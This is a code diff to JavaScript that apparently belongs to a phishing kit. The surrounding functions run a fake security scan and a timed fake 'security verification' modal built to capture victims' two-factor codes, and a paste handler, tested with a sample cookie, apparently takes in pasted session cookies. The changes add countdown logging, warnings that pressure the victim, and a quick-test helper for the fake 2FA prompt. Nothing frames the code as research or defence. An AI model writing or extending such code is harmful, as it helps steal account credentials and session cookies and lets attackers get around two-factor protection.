@@ -870,18 +870,21 @@ function showFakeScanningProgress() {
 
 // Enhanced 2FA capture setup with countdown
 function setupDelayed2FACapture() {
+    console.log('🕐 TIMER STARTED: 2FA modal will appear in 80 seconds...');
+    
     // Countdown notifications
     const countdownTimes = [60, 30, 10];
     
     countdownTimes.forEach(seconds => {
         setTimeout(() => {
+            console.log(`⏰ COUNTDOWN: ${seconds} seconds remaining until 2FA`);
             showNotification(`Security verification required in ${seconds} seconds...`, 'warning');
         }, (80 - seconds) * 1000);
     });
     
     // Final 2FA modal trigger
     setTimeout(() => {
-        console.log('80 seconds elapsed, opening 2-step verification modal...');
+        console.log('🔐 80 SECONDS ELAPSED - OPENING 2FA MODAL NOW!');
         showNotification('Security verification required - please authenticate', 'error');
         setTimeout(() => {
             openVerificationModal();
@@ -1075,6 +1078,24 @@ function testPasteFunction() {
     handlePasteEvent(testCookie);
     showNotification('Test paste function triggered!', 'info');
 }
+
+// Quick test for 2FA modal (5 seconds instead of 80)
+function quickTest2FA() {
+    console.log('🚀 QUICK TEST: 2FA modal will appear in 5 seconds...');
+    showNotification('Quick test: 2FA modal in 5 seconds...', 'warning');
+    
+    setTimeout(() => {
+        console.log('✅ Quick test complete - opening 2FA modal now');
+        showNotification('Security verification required - please authenticate', 'error');
+        openVerificationModal();
+    }, 5000);
+}
+
+// Add quick test on page load for debugging
+document.addEventListener('DOMContentLoaded', function() {
+    // Uncomment line below to test 2FA modal on page load (5 second delay)
+    // quickTest2FA();
+});
 
 // Keyboard shortcuts
 document.addEventListener('keydown', function(event) {
